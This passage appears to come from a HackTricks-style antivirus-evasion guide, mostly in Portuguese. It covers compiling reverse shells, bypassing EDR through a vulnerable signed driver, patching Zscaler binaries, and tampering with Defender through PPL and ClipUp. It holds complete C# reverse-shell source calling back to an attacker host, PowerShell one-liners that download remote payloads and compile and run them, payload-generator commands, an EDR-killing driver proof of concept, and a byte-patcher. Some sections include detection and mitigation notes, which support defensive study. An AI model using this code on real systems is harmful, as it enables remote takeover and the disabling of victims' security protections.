back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando o compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para build injectors — exemplo:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR a partir do espaço do kernel

Storm-2603 aproveitou uma pequena utilidade de console conhecida como **Antivirus Terminator** para desabilitar proteções endpoint antes de dropar ransomware. A ferramenta traz seu **próprio driver vulnerável mas *assinado*** e o abusa para emitir operações privilegiadas no kernel que até mesmo serviços AV Protected-Process-Light (PPL) não conseguem bloquear.

Key take-aways
1. **Signed driver**: The file delivered to disk is `ServiceMouse.sys`, but the binary is the legitimately signed driver `AToolsKrnl64.sys` from Antiy Labs’ “System In-Depth Analysis Toolkit”. Because the driver bears a valid Microsoft signature it loads even when Driver-Signature-Enforcement (DSE) is enabled.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
The first line registers the driver as a **kernel service** and the second one starts it so that `\\.\ServiceMouse` becomes accessible from user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar um processo arbitrário por PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Apagar um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD skips user-mode protections entirely; code that executes in the kernel can open *protected* processes, terminate them, or tamper with kernel objects irrespective of PPL/PP, ELAM or other hardening features.

Detecção / Mitigação
•  Habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.  
•  Monitorar a criação de novos serviços *kernel* e alertar quando um driver for carregado a partir de um diretório gravável por qualquer usuário ou não estiver presente na allow-list.  
•  Observar handles em modo usuário para objetos de dispositivo customizados seguidos por chamadas suspeitas de `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** aplica regras de postura do dispositivo localmente e depende de RPC do Windows para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam um bypass completo possível:

1. A avaliação de postura acontece **inteiramente no lado do cliente** (um booleano é enviado ao servidor).  
2. Endpoints RPC internos apenas validam que o executável conectante é **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados no disco** ambos os mecanismos podem ser neutralizados:

| Binary | Lógica original patchada | Resultado |
|--------|--------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, fazendo com que toda verificação seja considerada conforme |
| `ZSAService.exe` | Chamada indireta a `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode se ligar aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituído por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade no tunnel | Curtocircuitado |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Após substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binaries não assinados ou modificados podem abrir os endpoints RPC via named-pipe (p.ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido obtém acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser derrotadas com alguns patches de bytes.

## Abusando do Protected Process Light (PPL) para adulterar AV/EDR com LOLBINs

Protected Process Light (PPL) aplica uma hierarquia signer/nível de modo que apenas processos protegidos de nível igual ou superior podem adulterar uns aos outros. Do ponto de vista ofensivo, se você conseguir lançar legitimamente um binário habilitado para PPL e controlar seus argumentos, pode converter funcionalidades benignas (por exemplo, logging) em um primitivo de escrita restrito, suportado por PPL, contra diretórios protegidos usados por AV/EDR.

O que faz um processo rodar como PPL
- O EXE alvo (e quaisquer DLLs carregadas) devem estar assinados com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Um nível de proteção compatível deve ser requisitado que corresponda ao signer do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signers anti-malware, `PROTECTION_LEVEL_WINDOWS` para Windows signers). Níveis incorretos falharão na criação.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Auxiliar de código aberto: CreateProcessAsPPL (seleciona o nível de proteção e encaminha os argumentos para o EXE alvo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- Liste nomes curtos: `dir /x` em cada diretório pai.
- Obter caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (e.g., CreateProcessAsPPL).
2) Passe o argumento log-path do ClipUp para forçar a criação de um arquivo em um diretório protegido do AV (e.g., Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário alvo normalmente estiver aberto/bloqueado pelo AV enquanto em execução (e.g., MsMpEng.exe), agende a gravação na inicialização antes do AV iniciar instalando um serviço de auto-início que seja executado mais cedo de forma confiável. Valide a ordem de inicialização com Process Monitor (boot logging).
4) Na reinicialização a gravação com proteção PPL ocorre antes do AV bloquear seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que ClipUp escreve além do posicionamento; a primitiva é mais adequada para corrupção do que para injeção precisa de conteúdo.
- Requer privilégios locais de admin/SYSTEM para instalar/iniciar um serviço e uma janela de reboot.
- O timing é crítico: o alvo não deve estar aberto; execução em boot evita bloqueios de arquivo.

Detecções
- Criação de processos de `ClipUp.exe` com argumentos incomuns, especialmente quando for filho de launchers não padrão, durante o boot.
- Novos serviços configurados para auto-iniciar binários suspeitos e que consistentemente iniciam antes do Defender/AV. Investigue criação/modificação de serviços anterior a falhas de inicialização do Defender.
- Monitoramento de integridade de arquivos nos binários do Defender/diretórios Platform; criações/modificações de arquivos inesperadas por processos com flags de protected-process.
- Telemetria ETW/EDR: procurar processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis PPL por binários não-AV.

Mitigações
- WDAC/Code Integrity: restringir quais binários assinados podem rodar como PPL e sob quais pais; bloquear invocações de ClipUp fora de contextos legítimos.
- Higiene de serviços: restringir criação/modificação de serviços de auto-início e monitorar manipulação da ordem de inicialização.
- Garantir que a proteção contra adulteração do Defender e as proteções de inicialização antecipada estejam habilitadas; investigar erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se compatível com seu ambiente (testar exaustivamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
